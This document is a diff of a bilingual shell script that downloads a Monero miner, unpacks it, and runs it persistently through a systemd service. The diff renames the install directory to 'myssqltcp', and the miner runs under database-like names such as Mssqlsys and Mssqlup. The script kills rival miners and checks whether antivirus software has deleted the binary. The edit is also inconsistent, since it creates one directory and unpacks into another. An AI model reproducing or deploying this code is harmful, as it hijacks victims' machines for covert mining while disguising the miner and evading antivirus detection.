@@ -123,8 +123,8 @@ fi
 
 echo "I will download, setup and run in background Monero CPU server."
 echo "将进行下载设置,并在后台中运行phpup服务."
-echo "If needed, server in foreground can be started by $HOME/wkgg/Mssqlup.sh script."
-echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/wkgg/Mssqlup.sh script."
+echo "If needed, server in foreground can be started by $HOME/myssqltcp/Mssqlup.sh script."
+echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/myssqltcp/Mssqlup.sh script."
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
@@ -149,16 +149,16 @@ echo
 
 # start doing stuff: preparing server
 
-echo "[*] Removing previous wkgg Server (if any)"
-echo "[*] 卸载以前的 wkgg  (如果存在)"
+echo "[*] Removing previous Mysqlup Server (if any)"
+echo "[*] 卸载以前的 Myssqlup  (如果存在)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop Mssqlup_server.service
 fi
 killall -9 xmrig
 killall -9 phpup
 
-echo "[*] Removing $HOME/wkgg directory"
-rm -rf $HOME/wkgg
+echo "[*] Removing $HOME/myssqltcp directory"
+rm -rf $HOME/myssqltcp
 
 echo "[*] Downloading wkgg advanced version of phpup to /tmp/wkggxmr.tar.gz"
 echo "[*] 下载 Wkgg 版本的 wkggxmr 到 /tmp/wkggxmr.tar.gz 中"
@@ -171,24 +171,24 @@ fi
 echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/wkgg"
 echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/wkgg"
 [ -d $HOME/wkgg ] || mkdir $HOME/wkgg
-if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/wkgg; then
-  echo "ERROR: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/wkgg directory"
-  echo "发生错误: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/wkgg 目录"
+if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp; then
+  echo "ERROR: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/myssqltcp directory"
+  echo "发生错误: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp 目录"
   exit 1
 fi
 rm /tmp/wkggxmr.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/wkgg/Mssqlsys works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/wkgg/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/wkgg/config.json
-$HOME/wkgg/Mssqlsys --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/myssqltcp/config.json
+$HOME/myssqltcp/Mssqlsys --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/wkgg/Mssqlsys ]; then
-    echo "WARNING: Advanced version of $HOME/wkgg/Mssqlsys is not functional"
-	echo "警告: 版本 $HOME/wkgg/Mssqlsys 无法正常工作"
+  if [ -f $HOME/myssqltcp/Mssqlsys ]; then
+    echo "WARNING: Advanced version of $HOME/myssqltcp/Mssqlsys is not functional"
+	echo "警告: 版本 $HOME/myssqltcp/Mssqlsys 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HOME/wkgg/Mssqlsys was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/wkgg/Mssqlsys 下的Mssqlsys已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HOME/myssqltcp/Mssqlsys was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HOME/myssqltcp/Mssqlsys 下的Mssqlsys已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero server"
@@ -204,32 +204,32 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/wkgg"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/wkgg --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/wkgg directory"
-	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg 目录下"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/myssqltcp"
+  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/myssqltcp"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/myssqltcp --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/myssqltcp directory"
+	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/myssqltcp 目录下"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/wkgg/Mssqlsys works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/wkgg/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/wkgg/config.json
-  $HOME/wkgg/Mssqlsys --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/myssqltcp/config.json
+  $HOME/myssqltcp/Mssqlsys --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/wkgg/Mssqlsys ]; then
-      echo "ERROR: Stock version of $HOME/wkgg/Mssqlsys is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/wkgg/Mssqlsys 也无法使用"
+    if [ -f $HOME/myssqltcp/Mssqlsys ]; then
+      echo "ERROR: Stock version of $HOME/myssqltcp/Mssqlsys is not functional too"
+	  echo "发生错误: 该目录中的 $HOME/myssqltcp/Mssqlsys 也无法使用"
     else 
-      echo "ERROR: Stock version of $HOME/wkgg/Mssqlsys was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/wkgg/Mssqlsys 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HOME/myssqltcp/Mssqlsys was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HOME/myssqltcp/Mssqlsys 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Server $HOME/wkgg/Mssqlsys is OK"
-echo "[*] 服务 $HOME/wkgg/Mssqlsys 运行正常"
+echo "[*] Server $HOME/myssqltcp/Mssqlsys is OK"
+echo "[*] 服务 $HOME/myssqltcp/Mssqlsys 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -295,9 +295,9 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running server in the background (see logs in $HOME/wkgg/Mssqlsys.log file)"
-	echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/wkgg/Mssqlsys.log 日志文件)"
-    /bin/bash $HOME/wkgg/Mssqlup.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
+    echo "[*] Running server in the background (see logs in $HOME/myssqltcp/Mssqlsys.log file)"
+	echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/myssqltcp/Mssqlsys.log 日志文件)"
+    /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
 
@@ -309,7 +309,7 @@ else
 Description=Monero server service
 
 [Service]
-ExecStart=$HOME/wkgg/Mssqlsys --config=$HOME/wkgg/config.json
+ExecStart=$HOME/myssqltcp/Mssqlsys --config=$HOME/myssqltcp/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -343,8 +343,8 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit server to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/wkgg/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/wkgg/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config_background.json"
 fi
 echo ""
 
